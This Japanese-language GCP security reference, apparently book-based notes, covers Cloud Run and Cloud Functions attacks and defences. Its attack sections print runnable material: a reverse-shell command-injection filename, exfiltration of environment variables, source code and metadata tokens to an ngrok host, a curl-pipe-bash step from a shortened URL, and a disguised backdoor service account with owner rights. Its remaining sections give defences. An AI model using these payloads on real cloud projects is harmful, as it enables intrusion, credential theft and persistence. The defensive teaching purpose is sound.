# GCPコンピュートセキュリティリファレンス

Cloud Run/Cloud Functionsのセキュリティ脅威と対策パターンをまとめたリファレンス。イベントトリガーの悪用、バックドア設定、権限昇格の攻撃・防御パターンを記述。

---

## GCPコンピュートセキュリティ概要

### 主要な脅威

- **イベントトリガーの悪用**: Cloud Storageイベントを起点としたコードインジェクション攻撃
- **リバースシェル取得**: 悪意あるファイル名によるコマンド実行
- **環境変数・ソースコード・資格情報の窃取**: メタデータエンドポイントを経由した情報漏洩
- **バックドア設定**: サービスアカウントキー生成による永続化
- **権限昇格**: 過剰な権限を持つサービスアカウントの悪用

### 脆弱性が発生する条件

- ユーザー入力（ファイル名等）を検証せずにシェルコマンドに直接渡す
- サービスアカウントに `roles/owner` や `roles/editor` 等の過剰な権限を付与
- タイムアウト設定が長すぎる（20分等）→ リバースシェルセッション確立の余地
- 環境変数に秘密情報を直接格納（`SECRET=PASSWORD123`等）

---

## 2. イベントトリガーの悪用（Chapter 9）

### 2.1 攻撃シナリオ: Cloud Storageイベントトリガーによるコードインジェクション

1. 攻撃者が悪意あるファイル名（コマンドインジェクションペイロード）を持つファイルをアップロード
2. Cloud Run/Functionsがイベントをトリガーし、ファイル名を検証せずに処理
3. `subprocess.run(f"wkhtmltopdf {filename} ...", shell=True)` のようなコードでコマンド実行
4. リバースシェルが確立され、攻撃者が対話的にコマンド実行可能

### 2.2 攻撃パターン

#### リバースシェルペイロード生成（攻撃者VM）

```bash
# リバースシェルリスナー起動
nc -lvnp 4444

# 攻撃者のVM IPアドレスを変数に格納
RECEIVER_IP="XX.XX.XX.XX"

# リバースシェルコマンド構築
COMMAND="bash -i >& /dev/tcp/$RECEIVER_IP/4444 0>&1"

# Base64エンコード（特殊文字対策）
ENCODED=$(echo "bash -c '$COMMAND'" | base64 -w0)

# 悪意あるファイル名構築
FILENAME="index.html; echo $ENCODED | base64 -d | bash #.html"

# ファイル作成・アップロード
touch -- "$FILENAME"
gsutil cp -- "$FILENAME" gs://$INPUT_BUCKET/
```

#### リバースシェル確立後の情報窃取

```bash
# 現在のユーザー確認
whoami  # → root

# 環境変数一覧（秘密情報含む）
env
# 出力例:
# SECRET=PASSWORD123
# CLOUD_RUN_TIMEOUT_SECONDS=1200
# OUTPUT_BUCKET=ss-output-bucket-...

# メタデータエンドポイントからサービスアカウント情報取得
MD_URL="http://169.254.169.254/computeMetadata/v1"
curl -H "Metadata-Flavor: Google" "$MD_URL/instance/service-accounts/default/email"
# → html-to-pdf@PROJECT_ID.iam.gserviceaccount.com

# アクセストークン取得
ACCESS_TOKEN=$(gcloud auth print-access-token)

# サービスアカウント権限確認
gcloud projects get-iam-policy $PROJECT_ID \
  --flatten="bindings[].members" \
  --format='table(bindings.role)' \
  --filter="bindings.members:$SERVICE_ACCOUNT_EMAIL"
# → roles/owner（過剰な権限）

# Cloud Storage バケット一覧
gcloud storage buckets list --format="value(name)"

# バケット内の機密ファイルダウンロード
gsutil cp gs://$BUCKET_NAME/data.csv .
cat data.csv
# → 個人情報（PII）の漏洩
```

### 2.3 Parameter Manager パラメータの窃取

```bash
# Parameter Manager パラメータ一覧
gcloud parametermanager parameters list \
  --location=global \
  --format="value(name)"

# パラメータバージョン一覧
PARAM_NAME=$(gcloud parametermanager parameters list \
  --location=global --limit=1 --format="value(name)")

gcloud parametermanager parameters versions list \
  --location=global \
  --parameter=$PARAM_NAME

# パラメータデータ取得（デコード）
VERSION_NAME=$(gcloud parametermanager parameters versions list \
  --location=global --parameter=$PARAM_NAME --limit=1 --format="value(name)")

PARAM_DATA=$(gcloud parametermanager parameters versions describe $VERSION_NAME \
  --location=global --format="value(payload.data)")

echo $PARAM_DATA | base64 -d
# 出力例（旧バージョンに残った資格情報）:
# database:
#   username: admin
#   password: password12345
```

### 2.4 防御策

#### 入力検証（必須）

```python
import os
import subprocess
from pathlib import Path

# ❌ 脆弱なコード
subprocess.run(f"wkhtmltopdf {filename} output.pdf", shell=True)

# ✅ 安全なコード
# 1. ファイル名の検証（許可リスト方式）
safe_filename = Path(filename).name
if not safe_filename.endswith(('.html', '.htm')):
    raise ValueError("Invalid file extension")

# 2. shell=False + 引数リスト形式
subprocess.run(
    ["wkhtmltopdf", safe_filename, "output.pdf"],
    check=True,
    shell=False  # シェル経由での実行を禁止
)
```

#### サービスアカウント権限の最小化

```bash
# 現在の権限削除
gcloud projects remove-iam-policy-binding $PROJECT_ID \
  --member="serviceAccount:$SA_EMAIL" \
  --role="roles/owner"

# 必要最小限の権限のみ付与
gcloud projects add-iam-policy-binding $PROJECT_ID \
  --member="serviceAccount:$SA_EMAIL" \
  --role="roles/storage.objectViewer"

gcloud projects add-iam-policy-binding $PROJECT_ID \
  --member="serviceAccount:$SA_EMAIL" \
  --role="roles/storage.objectCreator"
```

#### タイムアウト短縮

```bash
# Cloud Run サービスのタイムアウトを10秒に設定
gcloud run services update $SERVICE_NAME \
  --region=$REGION \
  --timeout=10
```

#### 秘密情報の管理

```bash
# ❌ 環境変数に直接格納
gcloud run deploy $SERVICE_NAME \
  --set-env-vars SECRET=PASSWORD123

# ✅ Secret Managerを使用
gcloud secrets create db-password --data-file=-
gcloud run deploy $SERVICE_NAME \
  --update-secrets=DB_PASSWORD=db-password:latest
```

---

## 3. バックドアと権限昇格（Chapter 10）

### 3.1 攻撃シナリオ: サービスアカウントキー生成による永続化

1. 侵害されたCloud Runサービスからメタデータエンドポイント経由でアクセストークン取得
2. トークンを使ってサービスアカウントキーを生成
3. キーをエクスフィルトレーション（外部送信）
4. 攻撃者がキーを使って継続的にアクセス可能（バックドア完成）

### 3.2 攻撃パターン

#### サービスアカウントキー生成

```bash
# リバースシェル内でキー生成
SA_EMAIL=$(curl -s -H "Metadata-Flavor: Google" \
  "$MD_URL/instance/service-accounts/default/email")

gcloud iam service-accounts keys create /tmp/sa-key.json \
  --iam-account=$SA_EMAIL

# キーの内容確認
cat /tmp/sa-key.json
# → JSON形式のサービスアカウントキー
```

#### キーを使った認証（攻撃者環境）

```bash
# 攻撃者がキーをローカルに保存
# sa-key.json をCloud Shellにコピー

# サービスアカウントとしてログイン
gcloud auth activate-service-account --key-file=sa-key.json

PROJECT_ID=$(cat sa-key.json | jq -r ".project_id")
gcloud config set project $PROJECT_ID

# プロジェクトリソースへのアクセス確認
gcloud projects list
gcloud storage buckets list
```

#### バックドアサービスアカウント設定

```bash
# 正規のオペレーション名を装ったサービスアカウント作成
gcloud iam service-accounts create system-update-agent \
  --description="Handles routine system updates" \
  --display-name="System Update Agent"

# owner権限付与（過剰な権限）
gcloud projects add-iam-policy-binding $PROJECT_ID \
  --member="serviceAccount:system-update-agent@$PROJECT_ID.iam.gserviceaccount.com" \
  --role="roles/owner"

# キー生成
gcloud iam service-accounts keys create ~/sys-update-key.json \
  --iam-account=system-update-agent@$PROJECT_ID.iam.gserviceaccount.com
```

### 3.3 リバースシェル不要の攻撃パターン（タイムアウト10秒対策）

#### ngrokトンネルを使ったエクスフィルトレーション

```bash
# 攻撃者のローカルマシンでngrokトンネル起動
ngrok http 8000
# → https://<ID>.ngrok-free.app

# 環境変数をngrok経由で送信
NGROK_URL="https://<ID>.ngrok-free.app"
COMMAND="env | curl -X POST --data-binary @- $NGROK_URL"
ENCODED=$(echo "bash -c '$COMMAND'" | base64 -w0)
FILENAME="index.html; echo $ENCODED | base64 -d | bash #.html"

touch -- "$FILENAME"
gsutil cp -- "$FILENAME" gs://$INPUT_BUCKET/
```

#### ソースコード送信

```bash
# アプリケーションコード送信
COMMAND="curl -X POST --data-binary @main.py $NGROK_URL"
ENCODED=$(echo "bash -c '$COMMAND'" | base64 -w0)
FILENAME="index.html; echo $ENCODED | base64 -d | bash #.html"

touch -- "$FILENAME"
gsutil cp -- "$FILENAME" gs://$INPUT_BUCKET/
```

#### アクセストークン窃取（TinyURL経由）

```bash
# Gistにスクリプト保存
# send.sh:
#!/bin/bash
NGROK_URL="https://<ID>.ngrok-free.app"
TOKEN_URL="http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"
curl -s -H "Metadata-Flavor: Google" $TOKEN_URL \
  | curl -X POST --data-binary @- $NGROK_URL

# TinyURLで短縮
# https://gist.githubusercontent.com/USER/GIST_ID/raw/HASH/send.sh
# → https://tinyurl.com/ALIAS

# ファイル名に短縮URL埋め込み
SHORT_URL="https://tinyurl.com/ALIAS"
RAW_COMMAND="curl -sL $SHORT_URL | bash"
ENCODED=$(echo "$RAW_COMMAND" | base64 -w0)
FILENAME="index.html; echo $ENCODED | base64 -d | bash #.html"

touch -- "$FILENAME"
gsutil cp -- "$FILENAME" gs://$INPUT_BUCKET/
```

#### アクセストークンを使ったAPI呼び出し

```bash
# トークン受信後、攻撃者環境で使用
ACCESS_TOKEN="ya29...."

# プロジェクト一覧
curl -H "Authorization: Bearer $ACCESS_TOKEN" \
  https://cloudresourcemanager.googleapis.com/v1/projects

# Cloud Storage バケット一覧
curl -s -H "Authorization: Bearer $ACCESS_TOKEN" \
  "https://storage.googleapis.com/storage/v1/b?project=$PROJECT_NUMBER"

# サービスアカウントキー生成
BASE_URL="https://iam.googleapis.com/v1"
curl -s -X POST \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  "$BASE_URL/projects/$PROJECT_ID/serviceAccounts/$SA_EMAIL/keys" \
  -d '{}' \
  | jq -r '.privateKeyData' | base64 --decode > run-key.json
```

### 3.4 権限昇格パターン

#### Cloud Run Functionを経由した権限昇格

```bash
# 権限の低いサービスアカウントから、別のサービスアカウントになりすます
# html-to-pdf SA（roles/editor, roles/iam.serviceAccountUser）
# → superadmin SA（roles/owner）を作成し、キー生成

# superadmin SA作成
gcloud iam service-accounts create superadmin \
  --display-name="superadmin"

# owner権限付与
gcloud projects add-iam-policy-binding $PROJECT_ID \
  --member="serviceAccount:superadmin@$PROJECT_ID.iam.gserviceaccount.com" \
  --role="roles/owner"

# キー生成（html-to-pdf SAの権限で実行）
gcloud iam service-accounts keys create ~/superadmin-key.json \
  --iam-account=superadmin@$PROJECT_ID.iam.gserviceaccount.com
```

#### Compute Engine VMインスタンスを経由した権限昇格

```bash
# VMインスタンスに過剰な権限を持つサービスアカウントをアタッチして起動
gcloud compute instances create escalation-vm \
  --zone=$ZONE \
  --machine-type=e2-micro \
  --service-account=superadmin@$PROJECT_ID.iam.gserviceaccount.com \
  --scopes=cloud-platform

# SSHでVMに接続
gcloud compute ssh escalation-vm --zone=$ZONE

# VM内でメタデータエンドポイントから認証情報取得
curl -H "Metadata-Flavor: Google" \
  http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
```

### 3.5 防御策

#### サービスアカウントキーの管理

```bash
# サービスアカウントキー一覧
gcloud iam service-accounts keys list \
  --iam-account=$SA_EMAIL

# 不要なキー削除
gcloud iam service-accounts keys delete $KEY_ID \
  --iam-account=$SA_EMAIL

# キー作成の監視（Cloud Logging）
gcloud logging read \
  'protoPayload.methodName="google.iam.admin.v1.CreateServiceAccountKey"'
```

#### IAM権限の定期監査

```bash
# 全サービスアカウントの権限確認
for SA in $(gcloud iam service-accounts list --format="value(email)"); do
  echo "=== $SA ==="
  gcloud projects get-iam-policy $PROJECT_ID \
    --flatten="bindings[].members" \
    --format='table(bindings.role)' \
    --filter="bindings.members:serviceAccount:$SA"
done

# owner/editor権限を持つサービスアカウント検出
gcloud projects get-iam-policy $PROJECT_ID \
  --flatten="bindings[].members" \
  --filter="bindings.role:(roles/owner OR roles/editor) AND bindings.members:serviceAccount"
```

#### ネットワーク制御（egress制限）

```yaml
# Cloud Run サービスにVPCコネクタをアタッチし、egress制御
gcloud run services update $SERVICE_NAME \
  --region=$REGION \
  --vpc-connector=$VPC_CONNECTOR \
  --vpc-egress=private-ranges-only

# ファイアウォールルールで外部への通信を制限
gcloud compute firewall-rules create deny-egress \
  --direction=EGRESS \
  --action=DENY \
  --rules=all \
  --priority=1000 \
  --network=$NETWORK
```

---

## 4. GCPサーバーレスセキュリティチェックリスト

### 4.1 コード実装

- [ ] ユーザー入力の検証（ファイル名・パラメータ等）
- [ ] `subprocess.run(shell=False)` 使用（シェルインジェクション対策）
- [ ] 環境変数に秘密情報を格納しない（Secret Manager使用）
- [ ] パラメータマネージャーに資格情報を直接保存しない（Secret Manager参照）

### 4.2 サービスアカウント

- [ ] 最小権限の原則（roles/owner, roles/editor禁止）
- [ ] 各リソースに専用サービスアカウント割り当て
- [ ] サービスアカウントキーの定期ローテーション
- [ ] キー作成イベントの監視・アラート設定

### 4.3 Cloud Run/Functions設定

- [ ] タイムアウト設定の最小化（10-30秒推奨）
- [ ] 認証必須（`--no-allow-unauthenticated`）
- [ ] VPC Connector使用 + egress制限
- [ ] `max-instances` 設定（リソース枯渇対策）

### 4.4 監視・ログ

- [ ] Cloud Loggingでコマンド実行ログ監視
- [ ] 外部への異常な通信パターン検出
- [ ] メタデータエンドポイントアクセスログ確認
- [ ] サービスアカウントキー作成イベント監視

### 4.5 定期監査

```bash
# 週次/月次で実行
# 1. 全サービスアカウントのIAM権限確認
for SA in $(gcloud iam service-accounts list --format="value(email)"); do
  gcloud projects get-iam-policy $PROJECT_ID \
    --flatten="bindings[].members" \
    --filter="bindings.members:serviceAccount:$SA"
done

# 2. 不要なサービスアカウント削除
gcloud iam service-accounts list

# 3. 古いサービスアカウントキー削除
gcloud iam service-accounts keys list --iam-account=$SA_EMAIL

# 4. 未使用のCloud Run/Functionsリソース削除
gcloud run services list
gcloud functions list
```

---

## まとめ

- **イベントトリガーの悪用**: ファイル名等のユーザー入力をシェルコマンドに渡さない
- **リバースシェル対策**: タイムアウト短縮 + egress制限 + 入力検証
- **資格情報窃取対策**: 環境変数に秘密情報を保存しない、Secret Manager使用
- **バックドア対策**: サービスアカウントキーの定期監査・ローテーション
- **権限昇格対策**: 最小権限の原則、owner/editor権限の排除
- **継続的監視**: Cloud Loggingでキー作成・外部通信・メタデータアクセスを監視
